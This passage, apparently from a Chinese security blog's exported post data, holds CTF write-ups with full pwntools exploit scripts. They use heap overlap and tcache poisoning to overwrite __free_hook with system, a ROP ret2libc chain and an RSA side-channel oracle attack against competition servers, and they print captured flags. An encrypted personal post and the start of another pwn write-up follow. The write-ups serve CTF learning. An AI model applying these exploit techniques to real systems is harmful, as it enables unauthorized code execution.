dp(i):\tsla(&#x27;:&#x27;, &#x27;4&#x27;)\tsla(&#x27;:&#x27;, str(i))#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad(0, 0)\tad(1, 0x100)\tad(2, 0xf0)\tad(3, 0xf0)\tad(4, 0xf0)\tad(5, 0xf0)\tad(6, 0x100)\tad(7, 0x60)\tp = p64(0) + p64(0)\tp += p64(0x511)\tmd(0x0, p)\trm(1)\tad(1, 0x80)\tdp(1)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tli(&#x27;leak: &#x27; + hex(leak))\tmain_arena = 0x3afc40 #local\tmain_arena = 0x3ebc40\tlibc_base = leak - main_arena - 0x430 - 96\tfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\tli(&#x27;libc_base: &#x27; + hex(libc_base))\trm(1)\tp = p64(0) + p64(0)\tp += p64(0x91)\tp += p64(free_hook - 8)\tmd(0x0, p)\tad(1, 0x80)\tmd(1, &#x27;B&#x27; * 28)\tad(8, 0x80) # malloc to free_hook\tmd(8, p64(libc_base + libc.sym[&#x27;system&#x27;]))\tp = p64(0) + p64(0)\tp += p64(0x91)\tp += b&#x27;/bin/sh\\x00&#x27;\tmd(0, p)\tdb()\trm(1)    def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\nflag{ovgwkjRhB0EDgSHvp7ihCGPiRqHGAfUI}\npwn3 [youchat]当时网络有点差，比赛结束几分钟刚好打通远程，都怪没有看到update功能。。。\n这个漏洞在添加用户后，logout用户时，会释放当前内存地址-0x10，若控制好 addr-0x10处的大小，即可控制堆重叠，修改tcache fd为free_hook。\n#!/usr/bin/env python3#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.27&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;124.70.158.59&quot;server_port = 30023# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(iodef add(idx, i, d, d2):\tsla(&#x27;Your choice:&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, str(idx))\tsla(&#x27;:&#x27;, str(i))\tsa(&#x27;:&#x27;, d)\tsla(&#x27;:&#x27;, d2)def logout(i):\tsla(&#x27;Your choice:&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, str(i))def update(i, n):\tsla(&#x27;Your choice:&#x27;, &#x27;3&#x27;)\tsla(&#x27;:&#x27;, str(i))\tsla(&#x27;:&#x27;, n)def view(i):\tsla(&#x27;Your choice:&#x27;, &#x27;4&#x27;)\tsla(&#x27;:&#x27;, str(i))def chat():\tsla(&#x27;Your choice:&#x27;, &#x27;4&#x27;)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tadd(0, 0x81, b&#x27;A&#x27; * 0x58 + p64(0x4B1), b&#x27;C&#x27; * 0x10)\tadd(1, 0x81, b&#x27;B&#x27; * 0x1, &#x27;B&#x27; * 0x10)\tadd(2, 0x81, &#x27;C&#x27; * 0x1, &#x27;D&#x27; * 0x10)\tadd(3, 0x81, &#x27;/bin/sh\\x00&#x27; * 0x1, &#x27;E&#x27; * 0x10)\tadd(4, 0x81, &#x27;E&#x27; * 0x1, &#x27;F&#x27; * 0x10)\tadd(5, 0x81, &#x27;F&#x27; * 0x1, &#x27;G&#x27; * 0x10)\tadd(6, 0x81, &#x27;/bin/sh\\x00&#x27; * 0x1, &#x27;H&#x27; * 0x10)\tadd(7, 0x80, &#x27;H&#x27; * 0x70, &#x27;B&#x27; * 0x10)\tlogout(1)\tadd(8, 0x81, b&#x27;B&#x27; * 0x1, &#x27;B&#x27; * 0x10)\tview(8)\t\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;) \tmain_arena = 0x3afc40 # local\tmain_arena = 0x3ebc40 # local\tlibc_base = leak - main_arena - 0x3a2 - 96\tfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\tsh_str = libc_base +  0x1b40fa\tli(&#x27;libc_base: &#x27; + hex(libc_base))\t\tadd(9, 0x40, b&#x27;O&#x27; * 0x28 + p64(0x41) + p64(0) +  p64(0x91), &#x27;&#x27;)\tlogout(2)\tadd(10, 0x30, b&#x27;G&#x27; * 0x10 + p64(free_hook) + p64(free_hook), p64(free_hook))\tadd(11, 0x81, &#x27;F&#x27; * 0x1, &#x27;G&#x27; * 0x10)\tadd(12, 0x81, p64(libc_base + libc.sym[&#x27;system&#x27;]), b&#x27;G&#x27; * 0x8 + p64(0x91))\tadd(1, 0x81, &#x27;/bin/sh\\x00&#x27; + &#x27;A&#x27; * 0x10, &#x27;G&#x27; * 0x10)\tupdate(1, &#x27;/bin/sh\\x00&#x27;)\t#db()\tlogout(1)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\nflag{KNT5Z3gX6H9Honi5CH18kYHutIp7E8LD}\nCrypto3 [crypto_lp]rsa侧信道攻击\n该exp与是happi0师傅合作编写的，两个合作搞了半天，打通后，只打印flag前面部分，后面的数全为空，原因是没有整除查找，输出的是浮点类型的数。。。后面happi0师傅找到了原因并且打通了^_^，自己不懂，先贴着。\n#!/usr/bin/pythonfrom pwn import *import osfrom Crypto.Util.number import long_to_bytesfrom tqdm import tqdmr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)#context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def get(scret, c):    sl(&#x27;o&#x27;)    sl(str(scret))    sl(str(c))    ru(&#x27;&gt;&#x27;)    cd = int(ru(&#x27;\\n&#x27;), 10)    #li(&#x27;cd: &#x27; + str(c))    return cd    #--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    ru(&#x27;\\n&#x27;)    n = int(ru(&#x27;\\n&#x27;),10)    nn = int(ru(&#x27;\\n&#x27;),10)    C = int(ru(&#x27;\\n&#x27;),10)    li(&#x27;n: &#x27; + str(n))    li(&#x27;nn: &#x27; + str(nn))    li(&#x27;c &#x27; + str(c))    sl(&#x27;l&#x27;)    ru(&#x27;&gt;&#x27;)    tmp1 = int(ru(&#x27;\\n&#x27;),10)    li(&#x27;tmp1 &#x27; + str(tmp1))        sl(&#x27;p&#x27;)    sl(str(tmp1 + n))    ru(&#x27;&gt;&#x27;)    scret = int(ru(&#x27;\\n&#x27;),10)        l = 0    r = nn    i = 0;    while(l != r):        C = C * pow(2, 65537, nn) % nn        ret = get(scret, C)        li(&#x27;times:&#x27; + str(i) +&#x27; ret: &#x27; + str(ret))        if(ret == 0):            r = (l + r) // 2        else:            l = (l + r) // 2        i += 1    l = int(l)    l1 = l - 1    l2 = l + 1    li(&#x27;GET FLAG:\\n&#x27; + str(l))    li(&#x27;flag: &#x27; + str(l))    li(b&#x27;flag: &#x27; + long_to_bytes(l))    li(b&#x27;flag: &#x27; + long_to_bytes(l1))    li(b&#x27;flag: &#x27; + long_to_bytes(l2))def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    io = remote(&#x27;119.3.152.203&#x27;, 7001)    exploit()    finish()\n\n\n\nFinal competitionIndividual Jeopardypwn2#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and portserver_ip = &quot;10.10.21.11&quot;server_port = 10002# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(d):\tsla(&#x27;exit&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad(&#x27;song&#x27;)\tad(&#x27;jump&#x27;)\tad(&#x27;rap&#x27;)\tad(&#x27;NBA&#x27;)\tsla(&#x27;exit&#x27;, &#x27;4&#x27;)\tpop_rdi = 0x400c73\tp = b&#x27;A&#x27; * 0x10\tp += p64(0)\tp += p64(pop_rdi)\tp += p64(elf.got[&#x27;puts&#x27;])\tp += p64(elf.plt[&#x27;puts&#x27;])\tp += p64(0x4008B6)\tsl(p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;puts&#x27;]\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tsla(&#x27;exit&#x27;, &#x27;4&#x27;)\tp = b&#x27;A&#x27; * 0x10\tp += p64(0)\tp += p64(pop_rdi)\tp += p64(libc_base + 0x18ce17)\tp += p64(libc_base + libc.sym[&#x27;system&#x27;])\tsl(p)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process()\t\t\t#io = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n","categories":["ctf"],"tags":["pwn"]},{"title":"2020-11-01 周报","url":"/2020/11/01/life/weekly/2020-11-01-%E5%91%A8%E6%8A%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e338977ad5e4b826226d728e623940bc92efd6d6632bfd35559d2ab6b2256f0790469ca852f6565c966ed1551a80990fd95e424b4683e00130304043fbf406ca015d7c458ec909e9a6edf96235f5ef47d2039ba8c37a6edcb19c32a09fbfb371e59d5d795a011275dadf04a262fbe38c56c6b109e8ba584bc8fad77a8d4ecbbdd0feadd3af2898a0cd7715360250ac6f1abb5e84a3097990072fc4bd00d8482b1d8f9b48ab3304e6299c4891ee5b63f77689f8c40a58784399ad35a225bee6360e67f5d40233c85341b4e01771fd0f1a79971929fef3b3ed4ecf7ccecbcbcb1ab430a8341f4ecab924d62ab39ae65198a30a76ffb77f7f27f93ac4f823b43dcc552269eb04412574139158c9cd4e114ac4575c1ae89ec0521ca69ec12bfc81c67179acbd375caa3b47bed43c98aadc39119b3f35adb245de13118de3944a6c6f6cd94dfaf4fa1907660f2899e91a937ff584d79372d438def626862463bbf43ce3419c41b785f305991c96b027edb9d47812cfd3b01c5d5dc951c96c01cbd9e46b81cb5feeb7641acd92b03dc0b95bc619c4ed4118fd52316cb76a798e1a2bc8d796b30046c6620b6ef52c5b2fdd21cafc10f8cac670688b6daccb3333764e6434fbdba3541eb110e25248c8c7c3238665a01b4a674785ada76e5ce201a9a1af8844772a57a571af9951ff519c6291cc2d905efeee3d01dc37183a16b896f239ce78d700b6ae5f1136adc590291c01ea7e2e389abbc426b14537d110ef650d5698f40313b7b0c77130e979e864c85a3c04bc3b3276fb15e558df135fc1e57323d2cc75fa1998b017ea7f4489d3d5c7c9c4397e187920dfd16513c6bebf1c6ad27b19cd159899001b2dfc90f8936c4df1d38f2f865a5eda487532454f59d0b36fbc5f6dedf2cdb1b36deb2135bf4deecf4640d195ea3f443b9ea535fe6dda65ffdd1df126492d061272b8d10d4f76538caa9a669b83918c6d72b075e13140df38bee911aa5370e012d290f2e6620ad95fd02f6c6fd65e7f136e1f963b73b755e5cf6c8920dc8a6b63eeac280a4d9b2eb4f193ecdd1fe50292d80a6633c6707a24740e86b1b8342fd809a2f75a484b16e6be8f16323123518a34057f4587b269e8fde6956d1bf24b5e169c89f7bb8a7cd250311bf772d44d39de0f8ec0f1d010c0cffc09905b35d20035bc0281d8e18c869ffa7d2ab5a47b846132c527045cb91d552e3f94ffad4741e36ee4b4d4a2edcb5b2afd53ac51584b34dc4d42e3f7c89a5fb94117f2ff093065b916f6342a92030be4ce4e9d14286a22ed1a09e46abe4e71dbc6d235ef1bdfcbde9258f5363b4221e9e6b52f9e90f29e412afd46b522dd9eaa15d1afc3627f01dba25911dbba10d1ee5595256731457f7c14bcfa8221af1a4d8f784b544b2cafb0d35b8e68d913730a0dcbec742e3acf79c1d4cadab5fa85d6de617636e53fc674d2f0211eab0ee29a2e6c688d8469f6458ce12b570d29b422996caa7a9cc04c51bad99cf6a00a232f2f31def7bf222e7729f15c69519920bf8f966e97d438fa1fd23723f51c02031648273c443ac00f465004ee2f29ecab6c0df9cd12361bb83673df617185b83e8d6507aef368a63b9c03f2f0dd4e642944f1a288f5d9d02684f962ae80e28f67e0d03bdf0c037d071bf1654193393d30d853325ef54d1d5cdbc01e44058cc76c33db505943ce7121e07d45915ba4c4aa52b2a652f93346f26f699efa29be5335f835b6139e289495045291eb82b8972dc0294ed19d01b3ed56577085fe82bcaec5d5101064a6b109b975b12bf36127f43411d117ee54f365e6a92ed4211b8f6d82dbcd2ad6144af653e17576ec9215ec793cdaa92744ef8cf6cf241256a744d5e53445a21e7434a30ab42e8b8bfe61db6192ea230d9461a3405dbb1f9021d17b8836edb7c825fd5a811768021d7c48f4bc9cac416e912ac2c24022e0a92965a1f7788154d40d8941f413dd96aa7e9b63c1238f205a64854649ee803fc4300ba73244c00ae4db5d680346d21c9b0d6d529e37cec36285d9dd2ca33573eb4ebc102f6b63d1d5575ba3cfeebf63aef956e151cbc728112c3e7f34076ff730f3219012c49c20a55bc5db66f9a72feb1ae439cb0971d6c089efb2cb803031b28f91296464a276738e4f65717f95a44d053d305c7c403becdd8baf0ae6277431f7d1f6eb91eed05467d911f4ac2d954707d38c7bdeadf393cf3af72806b2b6b6180ea2435204226b7218f8ef23a4d2ff53b3d16b584c36cbf6912956999e0352331067d01669f538517504c8234d425fcc04471694869fb0950a59d6a87bb633b11632a289be4fcc9683b5ed098a2102ec3a3bfdd29dfb24c0b4711e2a0b20ba5239db739f96cb8dd101182a71ef7340a4a83de4cbe690cac94a8c8d2fb50e8873bb2ddb443de84e56424b20458c182043f3c1bec9a776170d53e2a9c44c38aaa519f4bc4e3dd6062d5a8ea9a5fb8f15605aa08eb5cfa6d4e1abc8b22c2af9f88fa969c0c792defbad4b42e18af044243557f56a56285c9c4426270606918e7629a6fe8c5e1db130193bc8c8c74b9868ba9dcb5f5acfe108cf944c2bb9de1919465d0bd1ce06b9f88f74af40ddae85925eaa8509889b0fb267d605d931a6ee04cb28a51dd7a1004f992bde0822f201e78d37e0b3838a4fea3a1a886c0e86c0be1e6aba0aa6e458ba0bbf61ee599baabe831e0e46ffc17e784c07452ebfd4e8b7ef85744301e8db6eaa45340cf1a41d94150a9efdb4890b13821b342b3cc0f3056d504a35373df2261fc22a60dc3f1616ed86dbfa688bbe06b1eac0f348d868c1bb9fec223a653a87ae5db3da649da401f0c0e807c32f60dcf0db7b7614a361ed9db2145688bebe6e90fb3cba4fefe78d1f85b2f5c116a9b29d698d3d80b76eeed24179b1d384db28f19d9cbb1eac81373a923673362147ac9069b562a81bae83784fe528c23060784c25c2bc78ba2401331aefa5bb48de0d329d37dea89f74256e49834ceb1a405587dceee40023cd4b68c563b5d70c6df995dcc2a20e8992d005b447c0420565d30e9eb096af4cb398e9973ad270dfabbd1a9d82c9079aed4f2edc89282b17ee014aca6296b85f1bc0826d301f54f174e29df4d18b79cf2a17d9aecd505c0714190c4b5ba92de9101b06e73c26b8bd63d55525896741eba5024759724eadfb7be7b63faba74d57e547a8f9480a0f0525905a8df166d94a90de62c93c93baa490f9d7cd59fd8eb1e619a10726090fa5034926d95013134f86132d7d4dce4157b2018e2298a2289f02bf49ceb78e25b1b5f863bc291d195be2e0775860f9f0a4c5d1d90d2dff5e40c44af64e036b5e81161986e3c7fc0022280c190689507d7c58af0d48395449d092244e577119420868fb8b2857390097dcfad9c686beb39358b35d7a57d9b2c142888d2320b75999e550a0cf70a0e8949e228d2337a6844a3cc8bdf105048a2b6d1e8edb8e21dda60e6276d5bc32d9d40cfd34bd74dd8a15f01147523ba3a4e8beea36fabfe718de31053f66e24c048f290f4fb3ba98e1982c359c3d6f870e4a01c20afcb0fc61072993d018e7225dd0ddc57e286cf1ce484590b0c81bb979a573ba9a2b75f78c47781916ebde75666c2bf8e130e9dab385d22951a99ea16b1783ce8bed4c23d5c8f6503c68927ddfcee8a48214523c104933c9f614d8c206ede3141b207cd92044842bb17fa6011ef147f5240d72e93486eadfd8d06b9b59eade41b455811973f875b9c3a96f9e657f99e1fc38c751361df30b716f3742c0c60102630ba37ffb654988ed272e0b068426e6bf19cb8b9131afc8bcfa7a442bc93a89fe0c0479037750eb74679868e029ffbcce414fd8616f223bd2c97e29334f550cd3ea1edeef84b03937ec8e1b0d075435646610bdc1afc4ec4325dfad31e46b6b899c827893fe3527a617d344f38d4348cbc786d1d76d76c4795af2fd05c4b39f45febe7fa81cd588277e3872f74d5cbd43df659a3aea7cd8ee969ed38c86fe658fb534c7a1900e85089a8fd3b222cd0beaba1ae940240f7f80b12fae7c4c8a25aef3d083cea59f5c8d4b50333380d18d523c9e8fac81454702c499bfe83da1c8b0cfc73fe5bdd09dbd8aa99b2666627323d1f643b07b76eb4d9a2519698b93ddd13df07683bf03a920dc98a4dc667d1f98693dd2afafe4c326c840da07f6c58b19aeda68acf6a454bf301ec5f85c267cfc70f9905b687c197ed677a932ce5c87baafb09250b32476d2a9649bc23ef0e08d3e7f1836fafdb7f393383bd15af6a9b0158312299a4abfaaa3b5439c9bd7d4a959478a9a55d3965a593793c7f07acb10ccd27e56cfcefb83f172f6d8dd01e935c048067d4debf527510868e17aadd7fc69e792d1230880f20e95cb00211b626951c13fa740089b61d64a5afa7d01fe1e1347328073f9393e2aab61231f2980e12258ab00abfa85ce4ab33c31ca0dc651767050928cfb7cd5fa3f9a472bfd600f16af6f6c4df24817282dc1ad9e7e47f98a53a76861a0f513402297cdd4888895dc20dc233e68a86acb99546bc132359b8fc6f5936fd62317dcdfe120d366138e72639937799805a1380f2e7c918edfd5f29bf6862e7904686518b271975a0767b5e374db0b6202b2c7e034e3e3021778dabe01e08ba6b2ee731db901d73493ea4a7b54f257c9feb656507d27213b61d4d5f6ecfe0a91dd2d32ac8970a974fb07c9e40b653b5085d34ad9b3a655c5d4660a6dfdf8d864a36486f99f9cd00f312d3c8ae97e1280826408bf3ce68f7b604902e4393f943cf3743df821536363323a119eaa1446c4030cefcc7e92d7ac5a4466d7acd7d33883aa6992d322a1b88e19b48e5118df3d04b8061a1920c15abf1801e2c70f7e7b9184b0a353dfc7bec444eadb849fb3bb5144057f9483125e8483e7ea89ff682786b009a3bdf57b6b768a50b5c9c25ec89a771962fc0be5e8b5e24b10c989814fd93405354ea423fea373841aea8efe3a0e46b708e5cde555991c703f56168135d7ca0019934b5d5980a9c26cfe871866d9d5bee99d2b46d5fa3eaa26d368d6b4438583bf1250c4aacd8f0a965ca6ccb4628abaa7bb0352e3016d02ad4b8bc41ec39fa31790f6031398b1ce7b2877f006bf2f9af8a2f906eb5e8abc62cfac473fc09398999f1972eadb4cb68a65cb15e5a80bca8cd1730ee72c90901de3fa30de65f4da4bb754296888f89a42b346dd6e6dade36d418f108e11ea92c18363f04c0d27df772239819fc7f2eb72c01558ce9af80eddb85338095a615524d6d4d9d68d6d3d4b44cf3c7ef1624c5c16e32ecdebb0e6e4c33963ff70cb7685276dcdc79aa31e00c52771380b135776b886a91606ad58bbfdb1213c74a9583f42d11fb99cf79f6b8c8a6fd3822b07ed5d9d8e74a8ffbce10a6e4b2b8a536f5632efdffee36f831b0ee7d94ef4c3079cd5179ea491de4a22a1670244b923e0ce7e6ad6ff114be74b11c9792a0a5f03327f4c53ae8df4a56cdb820e38beadb4075a206c26f90c13ae276644802dab5855881c7cfecdf4663c20da79adb07335096ac8be6c4fdf9358ba4447a40f1a6ab39d3e5f4ab60e3398cd59269e4e1c7338ff056eeabba473f936bf48c74e029b2a3a49c7d3c0b5f2d1f9c1200e0d0363e4870aa046c0d2ce22b169e078162ddb72e65f91736d365e3693300cf347224aaacc3ccaf51f5fd6ea0846b00008861c8c845fcbc5fa1be6359f9d8c7a406754db1584a0ac3348d1d9305b71599da5fcc7f9aa35fa48cf8761552bc727ef127084d1f11de1871372950afafed32e1e7fe84983d16bc5c63f7441c558fb3944aceaaf076aceef286f2ad8831ea98762e65b88268c91ac734df9b7105c8a7345425dd8841b8c1fdd214b77fecde99797077a186a89c64a36ba37da8c1b0309b1ee5596d8b44edf2a0028dfbcc1cc364692159ccf68edde57abda252bb06bf3f8f8b8baadf41fd992c76e22c27c741623782911739e5774fdef11678d80624c81de94acd8a2ee3a7f1c0229770be3532682deced3a1d8e7f1ca9afe6a4ea278999904e0d3368b1fbb00a95dec98b11e75c04c7eb8aad66dfdfb994aa078b015adf8bb3c41f36f44f39beb94cfbed1d6e0ea5d2c65d3a6c1d9d3bf757b70b7f0f0d701ac97c6391545f12b90b2e3c153a6722abc3deea722062c06284250fb1a039930c7268f3c919599ee216e8c0007293c7503ec431aad2607eebf7c2f48615615d9d054e2c6674b9aa0c20458fec728580ea4621f34820c64868720c57bf6f85fd97d7eb10e7ae7ca0ed33bd9c8f6eaff34d71822b7c2630b7c8e5c3bd03b80c8fc6e1c8788f95d21b29e9d0a686ad03d298c4528cd4993e11902f02c0098f65f13135a7a3c582fa0629566157d6720b539ff65c9cf1b4e3c99853d32d00e90c275714cc561c7efe480633def10d84a0a946684a6ed4b793ec214f42b9482e47725fd466558dcdcf9f4c724a2b424bd2cefb4ffc4c44f54c3a9a7a1e03c68b014627ce37685c900532ab9a2a6285e83c5ce65cae20edfab96a40bc159fdaf95137f0306f97450e53721009a4983928d1536e153fa873e9fa9bee407b54b1258e34bacf0cc93d6e0b1d9f551e0ac6e76bf53711e943247aaf52f016522d2dcdc1122d84128ac2be16c8cfbed48a62f506f4a32c86934f89ff5f8659c0ba70a636ccca32652bc286fd912070ffc91b577f34ba298091993a131bdf2565a9bd2f567351b34cc6e04b4a63699059d1a579a79f77cee6f6d713608252e9386e04d35ebcb5e5d71093ff7980e3f8d0bb60887e0d2093c742fbf18cf36925baa01b3e0fbda84052622dc9d9c4a27e4275e6ce3de1509d38723c167b4aa09ee78400b296f986ce15199323b38bbc48deafdce63d9569d580c6f4b19626f07180dccdfdb3ddf08775bfe03a6c6efdbab96a26bc7b000f4448fd4555cb9f66ccd09449d29665ce7b055a6cd77604a64551f68f04e551ded4391900f2a9c2787e7f13864f4834e7e86bc04b64eba83cffd527a50fd454ca8f692ec7ac13932cf389db5aa619c7925d679b63a63e0274c98f875ce67844f1fc20af2509a48e06e6a66ad8a56938183da7c39d620f31e76207c54e0b0a8eaaaf41897fc16df5aaeb0651be46ac65cf9ec0da192b4d89a3cf1d5786ddf7dc677a0989df6b44f082d012a4e279ba3eb66a9a868a08442a87beca511c94c9a9634abbc6bc39c25184105e4f24fe0230fc3ab13507c468a604ae7d8ed2879fbf32dbdd1ca9094e398635e06f589873cfceafbd\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"2020湖湘杯 Pwn WP","url":"/2020/11/01/security/ctf/compitation/wp-xhb-2020/","content":"湖湘杯0x01前言这一次比赛可惜没有过初赛的理论赛都没过，没注意湖湘杯理论赛。~~~~今天打这个湖湘杯, 我的师傅与我的同学都进线下了....@_@。不管怎样，下次好好加油。。。这次比赛出现简单题目分值高，怪了。。。\npwn1 [pwn_printf]下载\n保护\nArch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)\n\n主函数如下\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  __int64 v4; // [rsp+8h] [rbp-100A8h]  __int64 v5; // [rsp+10h] [rbp-100A0h]  __int64 v6; // [rsp+18h] [rbp-10098h]  __int64 v7; // [rsp+20h] [rbp-10090h]  __int64 v8; // [rsp+28h] [rbp-10088h]  __int64 v9; // [rsp+30h] [rbp-10080h]  __int64 v10; // [rsp+38h] [rbp-10078h]  __int64 v11; // [rsp+40h] [rbp-10070h]  unsigned __int16 *vul_size; // [rsp+48h] [rbp-10068h]  char v13; // [rsp+60h] [rbp-10050h]  char *format; // [rsp+10068h] [rbp-48h]  void *dest; // [rsp+10070h] [rbp-40h]  int v16; // [rsp+10078h] [rbp-38h]  int i; // [rsp+1007Ch] [rbp-34h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  dest = mmap((void *)0x4000000, 0x4000000uLL, 3, 34, -1, 0LL);  memcpy(dest, &quot;%1$00038s%3$hn%1$65498s%1$57344s%7$hn&quot;, 0x50uLL);  memcpy((char *)dest + 74, &quot;%1$00121s%3$hn%1$65415s%1$57344s%1$00064s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 121, &quot;%1$00164s%3$hn%1$65372s%1$*5$s%1$*8$s%9$hn&quot;, 0x2BuLL);  memcpy((char *)dest + 164, &quot;%1$00209s%3$hn%1$65327s%1$*8$s%1$65432s%9$hn&quot;, 0x2DuLL);  memcpy((char *)dest + 209, &quot;%8$c%1$01889s%2$c%4$s%1$63890s%3$hn&quot;, 0x24uLL);  memcpy((char *)dest + 245, &quot;%1$00292s%3$hn%1$65244s%1$57344s%1$00008s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 292, &quot;%1$00330s%3$hn%1$65206s%1$*5$s%11$hn&quot;, 0x25uLL);  memcpy((char *)dest + 330, &quot;%1$00377s%3$hn%1$65159s%1$57344s%1$00096s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 377, &quot;%1$00425s%3$hn%1$65111s%1$*5$s%1$*10$s%11$hn&quot;, 0x2DuLL);  memcpy((char *)dest + 425, &quot;%1$00472s%3$hn%1$65064s%1$*10$s%1$65439s%11$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 472, &quot;%10$c%1$01625s%2$c%4$s%1$64418s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 509, 